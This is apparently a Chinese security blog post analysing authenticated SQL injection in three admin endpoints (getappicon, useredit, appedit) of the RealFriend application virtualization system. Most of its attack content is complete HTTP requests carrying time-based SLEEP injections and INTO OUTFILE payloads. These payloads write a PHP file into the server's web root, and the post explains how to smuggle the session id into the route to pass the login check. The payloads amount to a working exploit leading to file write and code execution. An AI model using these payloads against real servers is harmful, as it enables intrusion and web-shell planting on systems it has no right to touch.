#  瑞友天翼应用虚拟化系统SQL注入漏洞  
标准云
                    标准云  蚁景网络安全   2026-06-25 09:35  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/TL4Y9UAcgruibhUn2nvLrs9mLNiaB1EywEk5fekyWAgJHrFof41PrHYJk9f0jbpDxWZHe4bl66MTEcIkd6nIxvZA/640?wx_fmt=gif&from=appmsg "")  
  
瑞友天翼应用虚拟化系统的 SQL 注入漏洞，经过挖掘发现，还存在一些后台 SQL 注入漏洞。  
  
重点关注传入参数可控并且拼接到 SQL 语句中的代码  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6hPIn6wbDQJryNfXRvDtQmbTsutYn82vcUbfibbOG2LHibRlVibOicZDzEw/640?wx_fmt=other&from=appmsg "null")  
  
## getappicon  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6xrRgaV86mhuUVj4ucyne5TCMksYtONrwxkMTzzMDNrgxQBUPHWv9gg/640?wx_fmt=other&from=appmsg "null")  
  
  
首先检测了登录状态，然后将通过 GET 获取到的参数 id 直接拼接到 SQL 语句中  
```
GET /hmrao.php?s=/Admin/getappicon/&id=1');SELECT+SLEEP(5)+AND('1 HTTP/1.1Host:192.168.222.145Upgrade-Insecure-Requests:1User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/85.0.4183.83Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN;UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6gMpscEZFrv1uomrQ8FTQYJKDJWNNbYrmaZmPT7C94cicoYiaB83KFjvQ/640?wx_fmt=other&from=appmsg "null")  
  
  
我们打印出执行的 SQL 语句，发现成功闭合 SQL  
  
‍  
```
GET /hmrao.php?s=/Admin/getappicon/&id=1');select%20'<?php%20phpinfo();?>'%20into%20outfile%20%27C:\\Program%20Files%20(x86)\\RealFriend\\Rap%20Server\\WebRoot\\test1.php%27%23 HTTP/1.1Host: 192.168.222.145Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN; UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc63zD6LicVXg0rzq7ZYP8mAjnZOYiazibu1sOJeYdJZbq8RQV9obbpC4emA/640?wx_fmt=other&from=appmsg "null")  
  
  
成功将文件写到根目录下  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6giaswoGd4Cg18suj3DciaMyh6lrKcWKfavibxt3sRP3RcqeSfgVmOXDMA/640?wx_fmt=other&from=appmsg "null")  
  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6ibpH9yf2kVXkt9IcGzq9qKf29gots0Uof7Tf88ZlNWdxbo6FOYOVY7Q/640?wx_fmt=other&from=appmsg "null")  
  
## useredit  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6JLEs3bhefJiaDENXKjSBz1khx1yyYhS1h39F0cKVVZprxAG3pibGxlOQ/640?wx_fmt=other&from=appmsg "null")  
  
  
首先检测了登录状态，然后将通过 GET 获取到的参数 id 直接拼接到 SQL 语句中  
  
我们看到这里检测登录状态的函数是 adminchecklogin  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6DQBGUb3hPuwocxwR5Y5L1Zm56FIr9KWnqlAtOdzQ0OW2nqvMPso80w/640?wx_fmt=other&from=appmsg "null")  
  
  
这里进行检测时会根据路由 sessId 来进行检测，所有需要将cookie 拼接在路由器上  
```
GET /hmrao.php?s=/Admin/useredit/sessId/c3gnn42nnfafaei5im0ti44tp2&uid=1');SELECT+SLEEP(5)%23 HTTP/1.1Host: 192.168.222.145Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN; UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6ZXmHTKPLYw4qMrogic9hSrKQ1HJ4ia65icsLxib0APKOs0yIn0MZEQhXCA/640?wx_fmt=other&from=appmsg "null")  
  
```
GET /hmrao.php?s=/Admin/useredit/sessId/c3gnn42nnfafaei5im0ti44tp2&uid=1');select%20'<?php%20phpinfo();?>'%20into%20outfile%20%27C:\\Program%20Files%20(x86)\\RealFriend\\Rap%20Server\\WebRoot\\test2.php%27%23 HTTP/1.1Host: 192.168.222.145Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN; UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6hShNquhKVzjeXW6q0KCicyZM62UwiaYy6ReibVyFX8BJpFuSBWYItw9icw/640?wx_fmt=other&from=appmsg "null")  
  
  
成功将文件写到根目录下  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6HOe727DpCF8qOyiaicAcC7Ivd3mVibp0llcg0dT8WatWzCjeibnwhMcghQ/640?wx_fmt=other&from=appmsg "null")  
  
  
‍  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6h1p9lvq9eKqqx02XI7jXViaUGKCfn2ZFVZhGiaUsm5ZYibNg4ialcY0cSg/640?wx_fmt=other&from=appmsg "null")  
  
## appedit  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc67qIjPoRFXcQD79OByo94nShmoZ67CT8IoKzwKXfJPRC9LmnFX0NDsA/640?wx_fmt=other&from=appmsg "null")  
  
  
首先检测了登录状态，然后将通过 GET 获取到的参数 id 直接拼接到 SQL 语句中  
  
这里检测登录状态的函数同样也是 adminchecklogin  
  
所以也需要将cookie 拼接在路由中  
```
GET /hmrao.php?s=/Admin/appedit/sessId/c3gnn42nnfafaei5im0ti44tp2&id=0');select+sleep(5)%23 HTTP/1.1Host: 192.168.222.145Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN; UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6oKeefqKXJZ2BpPDhl7MqFheCBEu1M2tsSj6s69dN00Hd8dDdZUFicgg/640?wx_fmt=other&from=appmsg "null")  
  
```
GET /hmrao.php?s=/Admin/appedit/sessId/c3gnn42nnfafaei5im0ti44tp2&id=0');select%20'<?php%20phpinfo();?>'%20into%20outfile%20%27C:\\Program%20Files%20(x86)\\RealFriend\\Rap%20Server\\WebRoot\\test.php%27%23 HTTP/1.1Host: 192.168.222.145Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.222.145/hmrao.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=c3gnn42nnfafaei5im0ti44tp2; think_language=zh-CN; UserAuthtype=0Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6hfPh0dHPBwXk1tu0onfrp80ZGU5icAFQEL9b6dMOLEic1IX37PmPa8SQ/640?wx_fmt=other&from=appmsg "null")  
  
  
成功将文件写到根目录下  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc63A9iao5B1j2tibXHg41qhVTdypJHZibmjodnELIx74xVRjpKxGSLzlNqw/640?wx_fmt=other&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TL4Y9UAcgrs4FGUS72EbYdsSvGH3nzc6oG52iaIAHNIyVtpQJodhicMPqiak3sBRVRZX0icsC9d72uVOOK6G7EJGYw/640?wx_fmt=other&from=appmsg "null")  
  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
  
